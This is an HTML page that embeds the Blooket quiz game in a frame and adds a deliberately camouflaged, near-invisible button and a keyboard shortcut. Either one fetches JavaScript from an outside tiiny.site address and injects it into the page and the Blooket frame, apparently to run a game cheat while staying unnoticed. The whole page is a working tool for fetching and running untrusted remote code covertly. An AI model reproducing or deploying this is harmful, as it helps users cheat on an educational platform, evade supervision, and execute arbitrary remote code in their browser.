<!DOCTYPE html>
<html>
<head>
    <title>Blooket</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        /* Camouflage button */
        .stealth-btn {
            position: fixed;
            top: 3px;
            right: 3px;
            width: 8px;
            height: 8px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 1px;
            cursor: pointer;
            opacity: 0.3;
            transition: opacity 0.3s, background 0.3s;
            z-index: 1000;
        }
        .stealth-btn:hover {
            opacity: 0.8;
            background: #2a2a2a;
        }
        /* Status indicator */
        .status {
            position: fixed;
            top: 15px;
            right: 15px;
            color: white;
            font-size: 12px;
            background: rgba(0,0,0,0.7);
            padding: 5px;
            border-radius: 3px;
            display: none;
            z-index: 1001;
        }
    </style>
</head>
<body>
    <iframe src="https://www.blooket.com" id="blooketFrame"></iframe>
    
    <!-- Camouflage button -->
    <button class="stealth-btn" onclick="runBookmarklet()" title="Run Script"></button>
    
    <!-- Status message -->
    <div class="status" id="status"></div>

    <script>
        function showStatus(message, isError = false) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.style.color = isError ? '#ff4444' : '#44ff44';
            status.style.display = 'block';
            setTimeout(() => {
                status.style.display = 'none';
            }, 3000);
        }

        async function runBookmarklet() {
            showStatus('Loading script from Tiiny...', false);
            
            try {
                // Fetch from your Tiiny.site URL
                const response = await fetch('https://amethyst-lisetta-54.tiiny.site/Bloom-2.js');
                
                if (!response.ok) {
                    throw new Error(`Failed to load: ${response.status}`);
                }
                
                const jsCode = await response.text();
                console.log('Script loaded from Tiiny:', jsCode.length, 'chars');
                
                // Inject into main page
                const script = document.createElement('script');
                script.textContent = jsCode;
                document.head.appendChild(script);
                
                showStatus('Script executed! Check Blooket.', false);
                
                // Try to inject into Blooket iframe after a delay
                setTimeout(() => {
                    try {
                        const iframe = document.getElementById('blooketFrame');
                        if (iframe.contentDocument) {
                            const iframeScript = iframe.contentDocument.createElement('script');
                            iframeScript.textContent = jsCode;
                            iframe.contentDocument.head.appendChild(iframeScript);
                            showStatus('Injected into Blooket too!', false);
                        }
                    } catch (e) {
                        console.log('Iframe injection blocked (normal)');
                    }
                }, 500);
                
            } catch (error) {
                console.error('Failed:', error);
                showStatus('Error: ' + error.message, true);
            }
        }

        // Keyboard shortcut
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'B') {
                e.preventDefault();
                runBookmarklet();
            }
        });

        // Auto-try when Blooket loads
        document.getElementById('blooketFrame').addEventListener('load', function() {
            console.log('Blooket loaded - ready for script');
            showStatus('Blooket ready - Click stealth button', false);
        });

        showStatus('Loaded - Use stealth button or Ctrl+Shift+B', false);
    </script>
</body>
</html>
